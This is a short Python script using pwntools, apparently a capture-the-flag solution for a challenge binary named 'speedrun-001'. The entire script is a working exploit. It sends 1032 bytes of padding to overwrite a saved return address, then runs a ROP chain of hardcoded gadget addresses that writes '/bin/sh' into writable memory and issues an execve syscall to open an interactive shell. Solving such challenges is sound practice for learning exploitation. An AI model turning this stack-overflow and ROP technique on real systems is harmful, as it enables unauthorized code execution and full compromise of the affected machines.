from pwn import *

target = process("./speedrun-001")

# addresses of gadgets we'll use
POP_RAX_RET = 0x415664
POP_RDI_RET = 0x400686
POP_RSI_RET = 0x4101f3
POP_RDX_RET = 0x44be16
MOV_QWORD_PTR_RSI_RAX_RET = 0x47f471
SYSCALL = 0x40129c

target.recvuntil("words?\n")

# 1032 bytes of junk data must be sent as input to overwrite the return address in the frame of a function that asks user for input
payload = 1032 * b'0'

# first we must write the string '/bin/sh' to some address in memory where writing is allowed, we select 0x6b6000
payload += p64(POP_RSI_RET)
payload += p64(0x6b6000)       # 0x6b6000 is a read,write area in memory we can write to without worrying about messing up program execution during exploit
payload += p64(POP_RAX_RET)
payload += b"/bin/sh\x00"
payload += p64(MOV_QWORD_PTR_RSI_RAX_RET)

# now time to add gadgets which will pop the shell
payload += p64(POP_RAX_RET)
payload += p64(0x3b)
payload += p64(POP_RDI_RET)
payload += p64(0x6b6000)
payload += p64(POP_RSI_RET)
payload += p64(0x0)
payload += p64(POP_RDX_RET)
payload += p64(0x0)
payload += p64(SYSCALL)

target.sendline(payload)
target.interactive()
